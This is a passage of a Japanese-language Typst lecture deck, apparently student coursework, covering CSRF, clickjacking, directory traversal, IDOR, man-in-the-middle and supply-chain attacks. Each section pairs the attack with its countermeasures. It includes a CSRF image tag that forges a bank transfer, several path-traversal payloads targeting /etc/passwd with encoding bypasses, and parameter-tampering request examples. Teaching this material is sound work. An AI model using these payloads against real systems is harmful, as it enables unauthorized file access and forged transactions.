          <input class="url-style" type="submit"
            value="[緊急] 先週の貴社発注分の欠品に関する件">
      </form></body></html>
      ```
  
      - 被害者がページを閲覧すると、ブラウザは bank.com にリクエストを送る
      ```html
      <img src="http://bank.com/transfer?to=attacker&amount=1000" width="0" height="0">
      ```
  
      - クッキーが含まれたリクエストであるため、サーバーは正当なユーザーのリクエストと判断して送金を実行する
    ]

  #pagebreak()

  - 対策

    - CSRFトークンの使用 @cf-cross-site-request-forgery
    
      - トークンを生成してセッションに保存し、フォーム送信時に共に渡す
      
      - サーバーはセッションのトークンとパラメータのトークンが一致するか検証する
      
      - 攻撃者は被害者のセッションに保存されたトークンを知ることができないため、攻撃は失敗する

  #pagebreak()
  - 対策
  
    - Refererの検証
      - リクエストが発生した前のページ(`Referer` ヘッダー)が意図されたドメインか確認する

    - SameSiteクッキーの設定 @mdn-set-cookie-header
      - `SameSite=Strict` または `Lax` を設定し、他ドメインからのクッキー送信を遮断する
]

#section(
  title: "セッション管理, ブラウザセキュリティ/クリックジャッキング",
  hero: [
    #vulnerability-chart((
      ([致命度], [低い], 30%),
      ([攻撃難易度], [低い], 20%),
      ([影響範囲], [普通], 30%),
      ([対策難易度], [極めて容易], 10%),
    ))
  ]
)[
  - クリックジャッキング (Clickjacking, UI Redress Attack) @mdn-clickjacking

  \
  
  - 透明な `<iframe>` などを用い、正常なウェブページの上に悪意のあるページを重ねる
  - ユーザーが意図したボタンではなく、透明なレイヤーのボタンをクリックさせる

  #pagebreak()

  - 実現
  
    - 攻撃シナリオ
      1. 攻撃者は「景品当選確認」ボタンがあるページを作成する
      2. 該当ボタンの位置に、透明度(`opacity: 0`)を調整した `facebook.com` の「いいね」ボタンや「アカウント削除」ボタンを iframe で重ねておく
      3. ユーザーは「景品確認」をクリックしたつもりだが、実際には Facebook の機能を実行してしまう
      
  #pagebreak()

  - 実現

  #figure(
    image("static/mdn-clickjacking-my-bank.png", width: 60%),
    caption: [クリックジャッキング手法における攻撃者の意図 (source: Mozilla @mdn-clickjacking)]
  )
  
  #figure(
    image("static/mdn-clickjacking-attacker.png", width: 60%),
    caption: [クリックジャッキング手法における被害者の画面 (source: Mozilla @mdn-clickjacking)]
  )
  
  #pagebreak()

  - 対策

    - `X-Frame-Options` ヘッダーの設定
      - `DENY`: 該当ページをいかなるフレーム内でも表示させない
      - `SAMEORIGIN`: 同一ドメインのフレーム内でのみ表示を許可
      - 例: Apacheの設定
        ```apache
        Header always set X-Frame-Options "SAMEORIGIN"
        ```
      
    - CSPの設定
      - `Content-Security-Policy: frame-ancestors 'self';`
]

#section(
  title: "ファイルと権限",
  hero: [
    #align(center + horizon)[
      #grid(
        columns: 3,
        align: center + horizon,
        gutter: 1.3em,
        [#rect(stroke: 2pt, inset: 1em, radius: .2em)[*File System*]],
        text(size: 1.8em)[$arrow.l.r.long$],
        [#rect(stroke: 2pt, inset: 1em, radius: .2em)[*Web App*]],
      )
      \
      #text(size: 1.3em, weight: "bold")[Access Control]
      \
      \
      システムのリソースに\
      誰が(Authentication)、どこまで(Authorization)\
      アクセスできるか？
    ]
  ]
)[
  - ウェブサーバーは根本的にファイルサーバーの機能を遂行する
  
    - クライアントがリクエストしたリソース(HTML, 画像, ダウンロードファイル)をファイルシステムから探して渡す
    
    - サーバー内部のシステムファイル(`/etc/passwd` など)や設定ファイルは、決して渡してはならない

  #pagebreak()

  - 権限管理の二つの軸
  
    1. 認証 (Authentication): あなたは誰か？ (ログイン)
    
    2. 認可 (Authorization): あなたはこれを行う資格があるか？ (アクセス制御)

  #pagebreak()

  - 発生する問題
  
    - ディレクトリトラバーサル: パス操作を通じて許可されたフォルダを脱し、システムファイルにアクセスする
    
    - アクセス制御の欠落: ログインさえすれば管理者ページなどの非認可ページにアクセス可能
    
    - 認可制御の欠落: 自身のアカウントでログインし、他人の個人情報や注文履歴を閲覧する (IDOR)
]

#section(
  title: "ファイルと権限/\nディレクトリトラバーサル",
  hero: [
    #vulnerability-chart((
      ([致命度], [高い], 70%),
      ([攻撃難易度], [低い#footnote[攻撃難易度が低く、自動化ツールで発見可能だが、誤って設定されたサーバーではシステム設定ファイルまで流出する可能性がある。]<directory-traversal-fn1>], 30%),
      ([影響範囲], [大きい@directory-traversal-fn1], 80%),
      ([対策難易度], [容易], 20%),
    ))
  ],
  header: "ファイルと権限/ディレクトリトラバーサル",
)[
  - リクエストURLまたはパラメータを変更し、意図しない動作を実行させたり、許可されていないリソースにアクセスしたりする

  #pagebreak()

  - 攻撃ベクトル

    - パス離脱\
      `../../../../etc/passwd` `../secret/config.yml`
    - URLエンコードによる回避\
      `..%2f..%2f..%2fetc%2fpasswd` #text(size: .8em)[(../ を %2f に)]\
      `%2e%2e/%2e%2e/%2e%2e/etc/passwd` #text(size: .8em)[(.. を %2e に)]
    - 二重エンコード (サーバー/プロキシ/フレームワークの処理の差異を悪用)\
      `%252e%252e%252fetc%252fpasswd` #text(size: .8em)[(%25 は % のエンコード)]
    - Windowsパス/区切り文字の変形(混合環境において)\
      `..\..\Windows\win.ini` `..%5c..%5cWindows%5cwin.ini`

  #pagebreak()

  - 攻撃ベクトル

    - パス正規化の混乱を誘発\
      `....//....//etc/passwd` #text(size: .8em)[(フィルタが `../` のみを防ぐ場合)]\
      `..//..//etc/passwd`
    - NULバイト(旧式/特定の構成で拡張子チェックの回避に使われたパターン)\
      `../../etc/passwd%00.png`

  - 例: `http://myfileserver.me` $->$ `http://myfileserver.me/../unauthorized-file.txt`

  #pagebreak()

  - 攻撃対象

    - `GET /download?file=report.pdf`
      ```python
      open(f"{BASE_DIR}/{user_input}")
      ```

  #pagebreak()
      
  - 対策
    
    - ファイルをID化し、ファイルIDをパラメータとして受け取る\
      `GET /download?id=12345`

    - パスクエリを解決#super[resolve]し、算出されたパスがベースディレクトリを離脱していないか確認する\
      `resolved_path.startswith(BASE_DIR + os.sep)`

    - 入力フィルタは多様な回避シナリオがあるため、推奨されない

  #pagebreak()
  
  #grid(
    columns: (2fr, 1fr),
    inset: .5em,
    [
      - ディレクトリリスティング(Directory Listing)

        - ディレクトリトラバーサルとしばしば同時に発見される
          - 組み合わさるとより致命的になる
    ],
    [
      #figure(
        image("static/apache-directory-listing.png", width: 100%)
      )
    ]
  )

  #pagebreak()
  - ディレクトリリスティング(Directory Listing)
    - ウェブサーバーでディレクトリにアクセスした際、そのディレクトリ内の内容物を表示する機能
    
    - 本来の用途は、目的の文書を探すために使用するもの

      - 最近ではディレクトリリスティングを利用したサーバー攻撃が頻発している
  
]

#section(
  title: "ファイルと権限/アクセス制御および認可制御の欠落",
  hero: [
    #vulnerability-chart((
      ([致命度], [高い], 80%),
      ([攻撃難易度], [低い], 20%),
      ([影響範囲], [大きい], 80%),
      ([対策難易度], [容易], 20%),
    ))
  ]
)[
  - アクセス制御(Authentication)と認可(Authorization)の概念の不在、または設計ミスにより発生

  - 誰でも簡単に攻撃できるが、致命的な情報漏洩につながる

  #pagebreak()

  - アクセス制御(Authentication) 欠落 @ipa-access-control

    - 非公開情報を扱う機能であるにもかかわらず、パスワードなどの秘密情報なしに識別子(ID, メールアドレス)のみでアクセスを許可している場合

    - メールアドレスなどは他人に公開され得る情報であるため、認証手段(Credential)にはなり得ない

  - 必ず第三者が知り得ない秘密情報(パスワードなど)を要求する認証機能を実装する

  #pagebreak()

  - 認可制御(Authorization) 欠落 @ipa-access-control

    - ログインしたユーザーが、自身の権限外である他人のデータを閲覧したり操作したりできる脆弱性

    - IDOR (Insecure Direct Object References; 不適切な認可)

    - ログイン(認証)は通過したが、「このデータを見る資格があるか？」(認可)を検証していないために発生

  #pagebreak()

  - 攻撃ベクトル: パラメータ改ざん

    - ウェブアプリケーションがユーザー識別をセッションではなくパラメータに依存している場合に発生
    
    - プロフィール閲覧機能
      - 正常なリクエスト: `http://site.com/mypage?user_id=100` (本人)
      - 攻撃リクエスト: `http://site.com/mypage?user_id=101` (他人)
    
  #pagebreak()

  - 攻撃ベクトル: パラメータ改ざん
  
    - 注文履歴照会
      - 正常なリクエスト: `POST /order_detail`\
        (body: `order_no=500`)
      - 攻撃リクエスト: `POST /order_detail`\
        (body: `order_no=501`)

  #pagebreak()

  - 対策

    - ユーザー識別時に外部入力値を信頼しない
      - `user_id` などをURLやフォームパラメータで受け取らず、サーバー側のセッション(Session)に保存された値を使用する

  #pagebreak()

  - 対策
      
    - 所有権検証ロジックの実装
    
      - リソース(注文番号など)にアクセスする際、そのリソースの所有者が現在ログインしているユーザーと一致するか必ず確認する
      
  ```sql
  -- 脆弱なパターン
  SELECT * FROM orders WHERE order_id = ?;

  -- 改善されたパターン (所有権検証を含む)
  SELECT * FROM orders WHERE order_id = ? AND user_id = ?;
  ```
]

#section(
  title: "システムインフラ",
  hero: [
    - 攻撃者にとって、システムインフラを担当するソフトウェアへの攻撃は価値が高い
  
    - 現代のセキュリティ事故は、個別のサービス実装よりも、システムインフラを攻撃する事例が多い
    
    - インフラの定期的なアップデートおよび設定点検により脆弱性を解消する

      - 例: DNSハイジャッキング --- システムが悪意のあるDNSサーバーに接続されている場合、攻撃者が通信に介入することが可能になる @fortinet-dns-hijacking @wikipedia-dns-hijacking 
  ]
)[]

#section(
  title: "システムインフラ/中間者攻撃",
  hero: [
    - クライアントとサーバーの通信の間に攻撃者が介入
    
    - Spoofing, Sniffing, Snooping --- 盗聴・改ざん攻撃を実行

    \

    - 現代の環境では暗号化通信が一般的であるため、旧世代のプロトコルを使用しないことで解消される
    - TELNET #sym.arrow SSH, HTTP #sym.arrow HTTPS
  ]
)[
  - 初期のインターネットでは暗号化が考慮されていなかった

  - 下位互換性のために旧世代のプロトコルを使用する可能性が高い機能では、代替案の用意が必要

  #pagebreak()

  - メール: ウェブサイトなど、セキュリティ対策がより成熟した手段を検討する
  
    - S/MIME, PGPなどのセキュリティ対策があるが、ユーザーの環境がそれらをサポートしていない可能性がある

    - ネットワーク構成により、サーバー間通信の暗号化(SMTP over SSL, POP/IMAP over SSL)をサポートしていない通信経路が存在する可能性がある
]

#section(
  title: "システムインフラ/\nサプライチェーン攻撃",
  hero: [
    - ソフトウェアの開発・配布過程の脆弱性を攻撃

    - 正常な供給経路にマルウェアを仕込むことを目標とする

    - 近年、より活発になっている攻撃手法
  ],
  header: "システムインフラ/サプライチェーン攻撃",
)[
  - 事例

    - 2025年 qix メンテナへの攻撃 @wiz-widespread-npm-supply-chain-attack-breaking-down @paloaltonetworks-npm-supply-chain-attack

      - 有名なJSパッケージのメンテナである qix 氏への攻撃
      
      - qix 氏が管理するすべてのNPMパッケージに悪意のあるコードを挿入し、マイナーアップデートとして配布
      - 影響を受けたNPMパッケージ:\
        #text(size: .6em)[`ansi-styles@6.2.2`, `debug@4.4.2`, `chalk@5.6.1`, `supports-color@10.2.1`, `strip-ansi@7.1.1`, `ansi-regex@6.2.1`, `wrap-ansi@9.0.1`, `color-convert@3.1.1`, `color-name@2.0.1`, `is-arrayish@0.3.3`, `slice-ansi@7.1.1`, `color@5.0.1`, `color-string@2.1.1`, `simple-swizzle@0.2.3`, `supports-hyperlinks@4.1.1`, `has-ansi@6.0.1`, `chalk-template@1.1.1`, `backslash@0.2.1`]
        
  #pagebreak()

  - 事例
  
    - 2024年 xz-utils へのバックドア挿入 @cve-2024-3094 @swtch-xz-timeline @tukaani-xz-backdoor

      - xz-utils は、ほぼすべてのLinuxで広範に使用されている

      - 攻撃者 Jia Tan が xz-utils プロジェクトに長期間貢献し、開発の信頼を獲得

      - xz-utils 5.6.0の準備過程で、攻撃コードを継続的に挿入

      - SSH接続の遅延に気づいた Andres Freund 氏によって発見される @openwall-oss-security-2024-03-29-4

      - 影響を受けた xz-utils: `xz-utils@5.6.0`, `xz-utils@5.6.1`

  #pagebreak()

  - 対策 @nist-defending-against-software-supply-chain-attacks-508 @skshieldus-headline-2410

    - 定期的な脆弱性スキャン、識別、パッチ適用プロセスの運用
    
    - ソフトウェア部品構成表(SBOM)の使用

    - 完全性検査および異常兆候のモニタリング

    - 発見された脆弱性の根本原因分析、SDLCおよび開発プロセスの継続的な改善
]

#section(
  title: "まとめ",
  hero: text(size: .6em)[
    #table(
      columns: (1fr, 2fr, 3.1fr),
      align: center + horizon,
      inset: (x: .5em, y: .5em),
      [分類],[内容],[タイプ],
      
      [任意コードおよびロジック実行], [主に意図しないデータの挿入により、攻撃者の意図通りにプログラムの処理フローが変化する], align(left)[#grid(columns: (1fr, 1fr), inset: .3em,
        [- SQLインジェクション], [- XSS攻撃], [- OSコマンドインジェクション], [- HTTPヘッダーインジェクション], [- メールヘッダーインジェクション], [- バッファオーバフロー],
      )],
      
      [
        セッション管理および\
        ブラウザセキュリティ
      ], [ユーザーのセッション情報を奪取したり、ブラウザの信頼関係を悪用して権限を盗用する], align(left)[#grid(columns: (1fr, 1fr), inset: .3em,
        [- セッション管理の不備], [- CSRF], [- クリックジャッキング],
      )],
    )
  ]
)[
  #text(size: .6em)[
    #table(
      columns: (1fr, 2fr, 3.1fr),
      align: center + horizon,
      inset: (x: .5em, y: .5em),
      [分類],[内容],[タイプ],
      
      [ファイルと権限], [ファイルシステムへのアクセスや重要機能の遂行時、適切な権限検証が欠落することで発生], align(left)[#grid(columns: (1fr), inset: .3em,
        [- ディレクトリトラバーサル],
        [- アクセス制御および認可の欠落],
      )],

      [システムインフラ], [直接開発したソフトではなく、依存関係のあるインフラシステムの脆弱性を攻撃する], align(left)[#grid(columns: (1fr, 1fr), inset: .3em,
        [- 旧バージョンSW攻撃], [- 中間者攻撃], [- サプライチェーン攻撃],
      )],
    )
  ]
  #pagebreak()
  #set list(marker: [・])
  #text(size: 24pt)[自身の感想]#text(size: 18pt)[ \/ 専門知識の側面]
  #text(size: 18pt)[
    - Hacker NewsやGeek Newsなどの技術ニュースを購読しており、様々なセキュリティ事件に接してきた。そのため、広く知られているセキュリティ脆弱性については十分に理解していると考えていた。
    
    - しかし、個別の攻撃ベクトルの原理、PoCコード、対応策を記述する際、参考文献に依存する場面が多く、期待していたよりもセキュリティ対策に関する学習が不足していたことを痛感した。

    - この課題を機に、個別の攻撃ベクトルに対するPoCの作成や、攻撃事件に関する事例学習を行うことができた。
  ]

  #pagebreak()
  
  #text(size: 24pt)[自身の感想]#text(size: 18pt)[ \/ 資料の適切性の側面]
  #text(size: 18pt)[
    - 各脆弱性の攻撃事例を整理する際、交換留学先である日本の事例よりも、出身国である韓国の事例を中心に扱ってしまう傾向があった。意識的にその内容を削ろうと試みたが、十分ではなかった。
    
    - IPAの『安全なウェブサイトの作り方』を基準に資料を作成したが、各脆弱性をやや強引に分類してしまった。恣意的で非標準的な分類を本資料に使用したことは反省すべき点だと考えている。
  ]
  
  #pagebreak()
  
  #text(size: 24pt)[自身の感想]#text(size: 18pt)[ \/ 課題要件の充足状況の側面]
  
  #text(size: 18pt)[
    - 『安全なウェブサイトの作り方』で扱われている内容を最大限網羅するよう努めた。しかし、90分の授業を基準に分量を調節した結果、資料全体の深さが浅くなってしまうという問題があった。
  
    - 分量に関して「ページ数の基準を超過しても構わない」という但し書きがあったにもかかわらず、分量を減らす方向で調整した。それにもかかわらず1ページあたり約1分で進めなければならないスライドになってしまった点が懸念される。
    ]
]

#bibliography("refs.bib", title: [References], full: true)